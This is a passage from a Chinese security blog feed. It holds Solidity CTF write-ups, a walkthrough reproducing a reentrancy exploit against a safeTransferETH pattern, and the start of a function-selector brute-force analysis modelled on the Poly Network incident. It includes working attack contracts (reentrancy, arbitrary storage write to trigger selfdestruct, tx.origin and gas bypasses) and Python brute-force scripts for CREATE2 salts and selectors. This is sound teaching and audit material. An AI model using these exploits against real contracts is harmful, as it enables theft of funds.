b506104596004803603602081101561042d57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061087c565b005b34801561046757600080fd5b506104aa6004803603602081101561047e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506109be565b005b6104ee600480360360208110156104c257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610c83565b005b3480156104fc57600080fd5b5061053f6004803603602081101561051357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610dbf565b005b8173ffffffffffffffffffffffffffffffffffffffff16816040516024018080602001828103825283818151815260200191508051906020019080838360005b8381101561059c578082015181840152602081019050610581565b50505050905090810190601f1680156105c95780820380516001836020036101000a031916815260200191505b50925050506040516020818303038152906040527f6bc344bc000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061067e578051825260208201915060208101905060208303925061065b565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146106e0576040519150601f19603f3d011682016040523d82523d6000602084013e6106e5565b606091505b5050505050565b60006060600060608473ffffffffffffffffffffffffffffffffffffffff1630604051602401808273ffffffffffffffffffffffffffffffffffffffff1681526020019150506040516020818303038152906040527f1e77933e000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106107e257805182526020820191506020810190506020830392506107bf565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610844576040519150601f19603f3d011682016040523d82523d6000602084013e610849565b606091505b50915091505050915091565b6000805a905063049e797c811415610871576000915050610877565b60019150505b919050565b600060608273ffffffffffffffffffffffffffffffffffffffff166040516024016040516020818303038152906040527f11f776bc000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061094d578051825260208201915060208101905060208303925061092a565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146109af576040519150601f19603f3d011682016040523d82523d6000602084013e6109b4565b606091505b5091509150505050565b8073ffffffffffffffffffffffffffffffffffffffff16306064604051602401808373ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506040516020818303038152906040527fa9059cbb000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610ab55780518252602082019150602081019050602083039250610a92565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610b17576040519150601f19603f3d011682016040523d82523d6000602084013e610b1c565b606091505b5050508073ffffffffffffffffffffffffffffffffffffffff163060c8604051602401808373ffffffffffffffffffffffffffffffffffffffff168152602001828152602001925050506040516020818303038152906040527fa9059cbb000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610c165780518252602082019150602081019050602083039250610bf3565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610c78576040519150601f19603f3d011682016040523d82523d6000602084013e610c7d565b606091505b50505050565b8073ffffffffffffffffffffffffffffffffffffffff1660016040516024016040516020818303038152906040527fa6f2ae3a000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610d525780518252602082019150602081019050602083039250610d2f565b6001836020036101000a03801982511681845116808217855250505050505090500191505060006040518083038185875af1925050503d8060008114610db4576040519150601f19603f3d011682016040523d82523d6000602084013e610db9565b606091505b50505050565b8073ffffffffffffffffffffffffffffffffffffffff1660c8604051602401808281526020019150506040516020818303038152906040527fe4849b32000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b60208310610e985780518252602082019150602081019050602083039250610e75565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610efa576040519150601f19603f3d011682016040523d82523d6000602084013e610eff565b606091505b5050505056fea26469706673582212204d057579c349cdfe3e7b6a0517f38117ca61899b79261b0c49d20aba97e3aae664736f6c634300060c0033&quot;;</span><br><span class="line"> </span><br><span class="line">    function deploy(bytes32 salt) public &#123;</span><br><span class="line">        bytes memory bytecode &#x3D; contractBytecode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">          addr :&#x3D; create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击合约</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity 0.6.12;</span><br><span class="line">contract test &#123;</span><br><span class="line">    constructor() public payable&#123;&#125;</span><br><span class="line">    bool nice &#x3D; true;</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        if(nice)&#123;</span><br><span class="line">            msg.sender.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;sell(uint256)&quot;,200)</span><br><span class="line">            );</span><br><span class="line">            nice &#x3D; false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function isOwner(address _owner) view public returns(bool)&#123;</span><br><span class="line">        uint gas1 &#x3D; gasleft();</span><br><span class="line">        if(gas1 &#x3D;&#x3D; 0x49e797c)&#123;&#x2F;&#x2F;浏览器调试</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function _change(address target) public returns (bool success, bytes memory data)&#123;</span><br><span class="line">        (bool success, bytes memory data)  &#x3D; target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;change(address)&quot;,address(this))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function change_own(address target) public &#123;</span><br><span class="line">        (bool success, bytes memory data)  &#x3D; target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;change_Owner()&quot;)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function buy_func(address target) public payable&#123;</span><br><span class="line">        target.call&#123;value: 1&#125;(</span><br><span class="line">            abi.encodeWithSignature(&quot;buy()&quot;)</span><br><span class="line">        );</span><br><span class="line">        &#x2F;&#x2F; check return value</span><br><span class="line">    &#125;</span><br><span class="line">    function for_flag(address target,string memory b64email) public &#123;</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;payforflag(string)&quot;, b64email)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function get_enough_money(address target) public&#123;</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;, address(this),100)</span><br><span class="line">        );</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;transfer(address,uint256)&quot;, address(this),200)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    function get_correct_time(address target) public&#123;</span><br><span class="line">        target.call(</span><br><span class="line">            abi.encodeWithSignature(&quot;sell(uint256)&quot;,200)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="赛题五"><a href="#赛题五" class="headerlink" title="赛题五"></a>赛题五</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fallback() external &#123;</span><br><span class="line">        if(map.length&gt;&#x3D;uint256(msg.sender))&#123;</span><br><span class="line">            require(map[uint256(msg.sender)]!&#x3D;1);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        if(token.balanceOf(address(this))&#x3D;&#x3D;0)&#123;</span><br><span class="line">            &#x2F;&#x2F;airdrop is over</span><br><span class="line">            selfdestruct(msg.sender);&#x2F;&#x2F;空投结束，触发自毁</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            token.safeTransfer(msg.sender,100); &#x2F;&#x2F;转账100token</span><br><span class="line">            </span><br><span class="line">            if (map.length &lt;&#x3D; uint256(msg.sender)) &#123;</span><br><span class="line">                increaseMapLength(uint256(msg.sender) + 1);</span><br><span class="line">            &#125;</span><br><span class="line">            map[uint256(msg.sender)] &#x3D; 1;  </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function increaseMapLength(uint256 len) internal &#123;</span><br><span class="line">        assembly&#123;</span><br><span class="line">            sstore(0x01, len) &#x2F;&#x2F;开辟空间</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;Guess the value(param:x) of the keccak256 value modulo 10000 of the future block (param:blockNum)</span><br><span class="line">    function guess(uint256 x,uint256 blockNum) public payable &#123;</span><br><span class="line">        require(msg.value &#x3D;&#x3D; 0.001 ether || token.allowance(msg.sender,address(this))&gt;&#x3D;1*(10**18));</span><br><span class="line">				&#x2F;&#x2F; guess要花费0.001 ether</span><br><span class="line">        require(blockNum&gt;block.number);&#x2F;&#x2F; blockNum要大于当前block.number</span><br><span class="line">        if(token.allowance(msg.sender,address(this))&gt;0)&#123;</span><br><span class="line">            token.safeTransferFrom(msg.sender,address(this),1*(10**18)); &#x2F;&#x2F;转账</span><br><span class="line">        &#125;</span><br><span class="line">        if (map.length &lt;&#x3D; uint256(msg.sender)+x) &#123;</span><br><span class="line">            increaseMapLength(uint256(msg.sender)+x + 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[uint256(msg.sender)+x] &#x3D; blockNum; &#x2F;&#x2F; 可以实现任意位置写入blocknum</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;Run a lottery</span><br><span class="line">    function lottery(uint256 x) public &#123;</span><br><span class="line">        require(map[uint256(msg.sender)+x]!&#x3D;0);&#x2F;&#x2F; 目标地址必须有值</span><br><span class="line">        require(block.number &gt; map[uint256(msg.sender)+x]);&#x2F;&#x2F; 目标地址值大于当前区块值才能开奖</span><br><span class="line">        require(blockhash(map[uint256(msg.sender)+x])!&#x3D;0);&#x2F;&#x2F; 不能使中间的参数为当前块为0</span><br><span class="line">        </span><br><span class="line">        bytes memory hash &#x3D; abi.encode(blockhash(map[uint256(msg.sender)+x]));</span><br><span class="line">        uint256 answer &#x3D; uint256(keccak256(hash))%10000;</span><br><span class="line">        &#x2F;&#x2F; 计算hash的后4位</span><br><span class="line">        if (x &#x3D;&#x3D; answer) &#123;</span><br><span class="line">            token.safeTransfer(msg.sender,token.balanceOf(address(this)));</span><br><span class="line">            selfdestruct(msg.sender);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/22/30/image-20211023204306611.png" alt="image-20211023204306611"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract dvp_attack &#123;</span><br><span class="line">    address public targetaddr;</span><br><span class="line">		function fallback() public  payable &#123;&#125;&#x2F;&#x2F;接受自毁的ether</span><br><span class="line">    constructor(address addr) public payable &#123;</span><br><span class="line">        targetaddr &#x3D; addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address addr) public returns(uint i)&#123;</span><br><span class="line">        i &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 x,uint256 blockNum) public &#123;</span><br><span class="line">        DVPgame gim&#x3D; DVPgame(targetaddr);&#x2F;&#x2F;实例化</span><br><span class="line">        gim.guess.value(0.001 ether)(&#123;x:x,blockNum:blockNum&#125;);&#x2F;&#x2F;调用guess任意地址写入</span><br><span class="line">        targetaddr.call(abi.encode(bytes4(keccak256(&quot;a()&quot;))));&#x2F;&#x2F;调用fallback函数</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/22/30/image-20211023204540146.png" alt="image-20211023204540146"></p>
<p>此时我们的x距离token位置偏出了c8c38cf8ac456ee7e0bc5e218f7ece57e53fb38d，把上次的x减去这个值，就是正确的token位置，再次attack 触发selfdestruct</p>
<p><img src="/2021/10/22/30/image-20211023204601673.png" alt="image-20211023204601673"></p>
<h1 id="赛题六"><a href="#赛题六" class="headerlink" title="赛题六"></a>赛题六</h1><p>题目说UnstoppableLender，所以就是要让它停下来。</p>
<p>题目中的poolBalance由deposit累加，但是可以直接通过token.transfer，来打破balanceBefore和poolBalance的同步功能。</p>
<p><img src="/2021/10/22/30/image-20211023204454937.png" alt="image-20211023204454937"></p>
<p><img src="/2021/10/22/30/image-20211023204640686.png" alt="image-20211023204640686"></p>
<h1 id="赛题七"><a href="#赛题七" class="headerlink" title="赛题七"></a>赛题七</h1><p>题目设置分别要通过三个考验</p>
<ol>
<li>密码公开可读取</li>
<li>tx.origin钓鱼 gas限制绕过</li>
<li>调用callfunction函数绕过</li>
</ol>
<p>通过浏览器读取密码</p>
<p><img src="/2021/10/22/30/image-20211023204926238.png" alt="image-20211023204926238"></p>
<p>部署攻击合约并且调试gas</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract att1&#123;</span><br><span class="line"></span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        CrossGates gim &#x3D; CrossGates( CrossGates address);</span><br><span class="line">        gim.gateOne();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/22/30/image-20211023205159002.png" alt="image-20211023205159002"></p>
<p><img src="/2021/10/22/30/image-20211023205111292.png" alt="image-20211023205111292"></p>
<h1 id="赛题八"><a href="#赛题八" class="headerlink" title="赛题八"></a>赛题八</h1><p>transfer函数未做from，to判断，导致可以找我转账任意铸币。这个很简单先领取空投，然后翻倍十三次金额，就能达到题目要求</p>
<p><img src="/2021/10/22/30/image-20211023205508672.png" alt="image-20211023205508672"></p>
<h1 id="赛题九"><a href="#赛题九" class="headerlink" title="赛题九"></a>赛题九</h1><p>三个点</p>
<ul>
<li>extcodesize绕过</li>
<li>delegatecall字节码绕过</li>
<li>salt爆破</li>
</ul>
<p>预编译指令 0x0000000000000000000000000000000000000002绕过</p>
<p>构造emit ForFlag(msg.sender);字节码</p>
<p>爆破脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">s1 = <span class="string">&#x27;0xff&#x27;</span>+ msg.sender</span><br><span class="line">s3 = <span class="string">&#x27;f14110c630e2e9cbd2e1fbe32823fa40f14535e40f0291373fb44d873d550825&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    tmp = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].ljust(<span class="number">64</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    salt = Web3.sha3(hexstr=(tmp+<span class="string">&quot;msg.sender&quot;</span>.lower()))</span><br><span class="line">    sa = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> salt])</span><br><span class="line">    s = s1+sa+s3</span><br><span class="line">    hashed = Web3.sha3(hexstr=s)</span><br><span class="line">    hashed_str = <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;%02x&#x27;</span> % b <span class="keyword">for</span> b <span class="keyword">in</span> hashed])</span><br><span class="line">    <span class="keyword">if</span> hashed_str[<span class="number">24</span>:].startswith(<span class="string">&quot;0000&quot;</span>):</span><br><span class="line">        print(tmp,hashed_str[<span class="number">24</span>:])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/10/22/30/image-20211023210439745.png" alt="image-20211023210439745"></p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>再谈重入攻击</title>
    <url>/2021/11/12/32/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>前几天无意间看到一篇名为<a href="https://medium.com/solidified/most-common-smart-contract-bugs-of-2020-c1edfe9340ac"><strong>Most common smart contract bugs of 2020</strong></a>的报告，进去认真看了一下，发现提到的一个重入攻击挺有意思的。就来复现一下。整个过程中也碰到了一些有意思的点。很遗憾的是，在即将写完这篇文章的时候，我在实际的审计过程中也遇到了相似的代码实现。</p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>先来看一段代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function update() &#123;</span><br><span class="line">   uint value &#x3D; deposits[msg.sender];</span><br><span class="line">   safeTransferETH(msg.sender, value)</span><br><span class="line">   deposits[msg.sender] &#x3D; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析发现这一段代码的功能是：</p>
<ul>
<li>获取用户的存款数额</li>
<li>使用<code>safeTransferETH</code>函数发送用户的存款</li>
<li>把用户的存款数额置为零</li>
</ul>
<p>一般的审计会认为这段代码是安全的，因为其使用的是<code>safeTransferETH</code>一般意义上是安全的函数。</p>
<p>但是让我们跟入<code>safeTransferETH</code>函数去看一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function safeTransferETH(address to, uint256 value) internal &#123; </span><br><span class="line">   (bool success, ) &#x3D; to.call&#123;value: value&#125;(new bytes(0)); </span><br><span class="line">   require(success, &#39;TransferHelper: ETH_TRANSFER_FAILED&#39;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>熟悉重入攻击的人一下子就能发现，这段代码十分的不安全。不了解的可以看这一篇<a href="https://zpano.cn/2021/07/22/22/">文章</a></p>
<h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><p>按照之前的攻击思路，完善一下受害合约，顺便写一下攻击合约</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">&#x2F;&#x2F;受害合约</span><br><span class="line">contract reterry&#123;</span><br><span class="line">    mapping(address &#x3D;&gt; uint) deposits;</span><br><span class="line">    </span><br><span class="line">    function deposit() public payable&#123;</span><br><span class="line">        deposits[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    function update() public&#123;</span><br><span class="line"></span><br><span class="line">       uint value &#x3D; deposits[msg.sender];</span><br><span class="line">       safeTransferETH(msg.sender, value);</span><br><span class="line">       deposits[msg.sender] &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    function getdeposit(address acoumt) public view returns(uint256)&#123;</span><br><span class="line">        return deposits[acoumt];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function safeTransferETH(address to, uint256 value) internal &#123; </span><br><span class="line">       (bool success, ) &#x3D; to.call&#123;value: value&#125;(new bytes(0)); </span><br><span class="line">       require(success, &#39;TransferHelper: ETH_TRANSFER_FAILED&#39;); </span><br><span class="line">    &#125;</span><br><span class="line">    function getbalance()public view returns(uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;攻击合约</span><br><span class="line">contract attack&#123;</span><br><span class="line">    reterry a&#x3D; reterry(address(Victimized contract);</span><br><span class="line">    uint256 i&#x3D;0;</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        a.update();</span><br><span class="line">    &#125;</span><br><span class="line">    function deposit() public &#123;</span><br><span class="line">        a.deposit&#123;value: 1 ether&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">    function attack1() public &#123;</span><br><span class="line">        a.update();</span><br><span class="line">    &#125;</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h2><p>进行一些初始化之后</p>
<p><img src="/2021/11/12/32/image-20211112152618870.png" alt="image-20211112152618870"></p>
<p>然后我们调用attack1函数进行攻击</p>
<p><img src="/2021/11/12/32/image-20211112152703160.png" alt="image-20211112152703160"></p>
<p>很遗憾的交易失败，我进行了debug调试</p>
<p><img src="/2021/11/12/32/image-20211112152957212.png" alt="image-20211112152957212"></p>
<p>发现成功的调用了攻击合约的fallback函数，此时我认为，是因为攻击合约的存款和受害合约的balance不成正比，导致最后一次的call调用返回了失败导致整体的回退。</p>
<h2 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h2><p><img src="/2021/11/12/32/image-20211112153417528.png" alt="image-20211112153417528"></p>
<p>这次我将攻击合约的存款与受害合约的balance调整为10:1，再次攻击，依旧失败了</p>
<p><img src="/2021/11/12/32/image-20211112153549877.png" alt="image-20211112153549877"></p>
<h2 id="第三次尝试"><a href="#第三次尝试" class="headerlink" title="第三次尝试"></a>第三次尝试</h2><p>这一次我想到了solidity 0.8.9的更新版本允许我们定义下面类型的fallback函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fallback(bytes calldata) external payable returns(bytes memory) &#123;</span><br><span class="line">        a.update();</span><br><span class="line">       return &#39;0x10000000&#39;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>当call调用之后，我们自行定义返回值，使得返回值的第一个字节为1也就等价于true。不知道我们自定义的返回值是否会对bool success产生影响，如果可以的就可以使得我们的重入不会在最后一次失败。</p>
<p><img src="/2021/11/12/32/image-20211112155410883.png" alt="image-20211112155410883"></p>
<p>再次失败，进过调试发现我们自定义的返回值对bool success并未产生影响。再次翻阅call调用的返回值的定义，发现 call函数的返回值为true或者false。 只有当能够找到此方法并执行成功后，会返回true，而如果不能够找到此函数或执行失则会返回false。因此我刚刚的方法不能奏效。</p>
<h2 id="第四次尝试"><a href="#第四次尝试" class="headerlink" title="第四次尝试"></a>第四次尝试</h2><p>经过进一步调试发现，未限制重入次数的情况下，总会在最后一次call失败，如果我们能控制重入的次数应该就可以实现，保证每一次都是成功的，就可以实现交易不会失败。</p>
<p>稍微改善代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uint i;</span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        i+&#x3D;1;</span><br><span class="line">        if(i&lt;10)&#123;</span><br><span class="line">            a.update();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>​    <img src="/2021/11/12/32/image-20211112203847429-6728279.png" alt="image-20211112203847429"></p>
<p>启动attack</p>
<p><img src="/2021/11/12/32/image-20211112203903989.png" alt="image-20211112203903989"></p>
<p>攻击成功！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    本次漏洞发生的原因在于错误的利用被认为是安全的函数代码库，而在实际的审计过程中大家往往会忽略这种函数的审查，误以为其是安全的。其实一进入该函数的实现，就能轻而易举的发现问题，也算是人性的弱点吧。本来想展示实际业务中的审计到的代码，但是由于业务保密性要求，很遗憾不能展示。</p>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
        <tag>智能合约安全</tag>
      </tags>
  </entry>
  <entry>
    <title>从一道智能合约赛题看Poly Network 事件</title>
    <url>/2021/11/12/33/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​    前几天参加了一个比赛，上面有一道题目与Poly Network 事件攻击手法类似，写一篇文章来总结一下。简单说一下攻击的点在于函数签名值的爆破，错误的设置合约owner。</p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>合约的代码文件在<a href="https://github.com/zpano/BlockChain-Security/tree/main/solidity%E5%90%88%E7%BA%A6%E8%B5%9B%E9%A2%98%EF%BC%88%E5%85%A8%E9%83%A8%EF%BC%89/%E8%B5%9B%E9%A2%983">Github</a>上，可以自行下载。下面分析漏洞点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &#x2F;&#x2F;DVT3.sol</span><br><span class="line"> 		function changeOwner(address newOwner) public onlyOwner returns(bool) &#123;</span><br><span class="line">        require(newOwner !&#x3D; address(0));</span><br><span class="line">        emit OwnerExchanged(owner, newOwner);</span><br><span class="line">        owner &#x3D; newOwner;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function payforflag() public onlyOwner &#123;</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这段代码中，我们想要实现触发SendFlag事件必须要有owner权限，而changeOwner函数权限也掌握在owner中，我们无法突破。但是让我们来看另一段代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Airdrop.sol</span><br><span class="line">function TransferOrAirDrop(address to, bool isTransfer, bytes calldata _method, uint256 amount) external &#123;</span><br><span class="line">        if (isTransfer) &#123;</span><br><span class="line">            bytes memory returnData;</span><br><span class="line">            bool success;</span><br><span class="line">            (success, returnData) &#x3D; token.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(address,address,uint256)&quot;))),abi.encode(msg.sender,to,amount)));</span><br><span class="line"></span><br><span class="line">            require(success, &quot;executeProposal failed&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            bytes memory returnData;</span><br><span class="line">            bool isFristAirDropFlag;</span><br><span class="line">            bool success;</span><br><span class="line">            if(AirDropCount[msg.sender] &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                isFristAirDropFlag &#x3D; true;</span><br><span class="line">            &#125; else if (AirDropCount[msg.sender] &gt; 2) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            (success, returnData) &#x3D; token.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bool,address)&quot;))), abi.encode(isFristAirDropFlag, msg.sender)));</span><br><span class="line">            require(success, &quot;executeProposal failed&quot;);</span><br><span class="line">            AirDropCount[msg.sender]++;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在TransferOrAirDrop函数中，使用了call调用，但是未做调用函数名的限制，且_method参数可控，就可以通过爆破函数签名的方式调用token合约上的任意函数。在此处我们依旧可以注意到</p>
<p><img src="/2021/11/12/33/image-20211024153527420.png" alt="image-20211024153527420"></p>
<p>对于DVT3合约上的owner被设置为了Airdrop的地址，也就是说我们可以调用前面提到的changeOwner函数变成合约的owner，进而实现触发SendFlag事件。</p>
<h1 id="Poc分析"><a href="#Poc分析" class="headerlink" title="Poc分析"></a>Poc分析</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sha3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=sha3.keccak_256()</span><br><span class="line">p.update(<span class="string">b&#x27;changeOwner(address)&#x27;</span>)</span><br><span class="line">print(p.hexdigest()[:<span class="number">8</span>])</span><br><span class="line"><span class="comment">#a6f9dae1</span></span><br></pre></td></tr></table></figure>
<p>再分析下面的两个call调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(success, returnData) &#x3D; token.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(address,address,uint256)&quot;))),abi.encode(msg.sender,to,amount)));</span><br><span class="line">(success, returnData) &#x3D; token.call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bool,address)&quot;))), abi.encode(isFristAirDropFlag, msg.sender)));</span><br></pre></td></tr></table></figure>
<p>对于第一个调用我们需要爆破出满足<code>_method(address,address,uint256)</code>函数签名为0xa6f9dae1的_method，往后传入的第一个参数为msg.sender，恰好等于下面的代码</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">token.call(abi.encode<span class="constructor">Packed(<span class="params">bytes4</span>(<span class="params">keccak256</span>(<span class="params">abi</span>.<span class="params">encodePacked</span>(<span class="string">&quot;changeOwner(address)&quot;</span>)</span>)),abi.encode(msg.sender)));</span><br></pre></td></tr></table></figure>
<p>对于第二个调用我们需要爆破出满足<code>_method((bool,address)</code>函数签名为0xa6f9dae1的_method，往后传入的第一个参数为isFristAirDropFlag，恰好等于下面的代码</p>
